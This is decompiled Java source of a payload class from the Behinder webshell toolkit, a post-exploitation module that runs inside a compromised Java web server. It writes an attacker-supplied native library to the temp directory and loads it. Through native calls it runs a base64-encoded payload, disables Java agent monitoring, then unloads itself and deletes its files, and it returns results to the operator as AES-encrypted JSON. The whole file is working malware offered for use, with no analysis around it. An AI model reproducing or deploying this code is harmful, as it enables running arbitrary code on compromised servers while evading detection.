package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class LoadNativeLibrary implements Runnable {
   public static String whatever;
   public static String action;
   public static String fileContent;
   public static String payload;
   public static String filePath;
   public static String uploadLibPath;
   private Object Request;
   private Object Response;
   private Object Session;
   private String nativeLibPath;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var13 = false;

      Object so;
      Method write;
      label77: {
         try {
            var13 = true;
            this.fillContext(obj);
            String libraryPath = this.loadLibrary(getFileData(uploadLibPath));
            (new Thread(new LoadNativeLibrary(libraryPath))).start();
            result.put("status", "success");
            result.put("msg", "Payload加载成功");
            var13 = false;
            break label77;
         } catch (Exception var17) {
            result.put("status", "fail");
            result.put("msg", "Payload加载错误：" + var17.getMessage());
            var13 = false;
         } finally {
            if (var13) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var14) {
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var15) {
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var16) {
      }

      return true;
   }

   private boolean isWindows() {
      return System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0;
   }

   public String loadLibrary(byte[] fileContent) throws Exception {
      String libSuffix = System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0 ? ".dll" : ".so";
      String libPrefix = UUID.randomUUID().toString();
      String tempDir = System.getProperty("java.io.tmpdir");
      File library = new File(tempDir + File.separator + libPrefix + libSuffix);
      library.deleteOnExit();
      if (this.sessionGetAttribute(this.Session, "nativeLibs") == null) {
         List libs = new ArrayList();
         libs.add(library.getAbsolutePath());
         this.sessionSetAttribute(this.Session, "nativeLibs", libs);
      } else {
         List libs = (List)this.sessionGetAttribute(this.Session, "nativeLibs");
         Iterator var7 = libs.iterator();

         while(var7.hasNext()) {
            String libPath = (String)var7.next();
            (new File(libPath)).delete();
         }

         libs.add(library.getAbsolutePath());
      }

      FileOutputStream output = new FileOutputStream(library, false);
      output.write(fileContent);
      output.flush();
      output.close();
      System.load(library.getAbsolutePath());
      return library.getAbsolutePath();
   }

   public String loadLibrary(String libraryPath) throws Exception {
      File library = new File(libraryPath);
      library.deleteOnExit();
      if (this.sessionGetAttribute(this.Session, "nativeLibs") == null) {
         List libs = new ArrayList();
         libs.add(library.getAbsolutePath());
         this.sessionSetAttribute(this.Session, "nativeLibs", libs);
      } else {
         List libs = (List)this.sessionGetAttribute(this.Session, "nativeLibs");
         Iterator var4 = libs.iterator();

         while(var4.hasNext()) {
            String libPath = (String)var4.next();
            (new File(libPath)).delete();
         }

         libs.add(library.getAbsolutePath());
      }

      System.load(library.getAbsolutePath());
      return library.getAbsolutePath();
   }

   public void execute(byte[] payload) {
   }

   public LoadNativeLibrary() {
   }

   public LoadNativeLibrary(String nativeLibPath) {
      this.nativeLibPath = nativeLibPath;
   }

   public void run() {
      try {
         if (action.equals("freeFile")) {
            File libFile = new File(filePath);
            String libFileName = libFile.getName();
            this.freeFile(libFileName);
            Thread.sleep(500L);
            libFile.delete();
         } else if (action.equals("execute")) {
            this.load(this.base64decode(payload));
         } else if (action.equals("antiAgent")) {
            this.antiAgent();
         }
      } catch (Exception var11) {
         var11.printStackTrace();
      } finally {
         if (this.isWindows()) {
            this.selfUnload(this.nativeLibPath);
         }

         try {
            Thread.sleep(500L);
         } catch (InterruptedException var10) {
         }

         (new File(this.nativeLibPath)).delete();
      }

   }

   public native void inject(byte[] var1);

   public native int load(byte[] var1);

   public native void freeFile(String var1);

   public native void selfUnload(String var1);

   public native void antiAgent();

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private String base64encode(String clearText) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   public static byte[] getFileData(String filePath) throws Exception {
      byte[] fileContent = new byte[0];
      FileInputStream fis = new FileInputStream(new File(filePath));
      byte[] buffer = new byte[10240000];

      int length;
      for(boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
      }

      fis.close();
      return fileContent;
   }

   public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
      ByteArrayOutputStream output = new ByteArrayOutputStream();
      output.write(a);
      output.write(b);
      return output.toByteArray();
   }
}
